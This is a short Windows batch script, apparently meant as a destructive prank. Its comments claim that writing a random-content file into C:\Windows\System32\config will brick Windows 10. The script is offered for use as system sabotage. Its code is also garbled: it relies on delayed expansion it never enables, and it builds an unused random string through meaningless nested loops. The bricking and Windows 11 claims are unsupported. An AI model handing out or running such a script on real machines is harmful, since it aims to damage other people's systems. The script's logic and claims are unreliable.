REM Use at own Risk on Windows 10 this WILL BRICK YOUR SYSTEM you will have to Reinstall Windows after Restarting.
REM (Exept if you delete the file in the Win32/config folder) 
REM On Windows 11 this will not work due to Windows deleting the File by itself on Restart!


@echo off
setlocal

set "OutputDir=C:\Windows\System32\config"

set "FileName=OSDATA.txt"

set "FilePath=%OutputDir%\%FileName%"

set "RandomString="
for /L %%i in (1,1,20) do (
    set /a "RandChar=!RANDOM! %% 26 + 65"
    for /f "tokens=*" %%a in ('echo %%RandChar%%') do (
        for /f "tokens=*" %%b in ('cmd /c exit %%RandChar%% ^& set /a ""') do (
            set "RandomString=!RandomString!!Char_!RandChar!"
        )
    )
)

set "RandomData=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%"

echo %RandomData% > "%FilePath%"

echo A file named "%FileName%" with random content has been created at:
echo %FilePath%

endlocal
pause

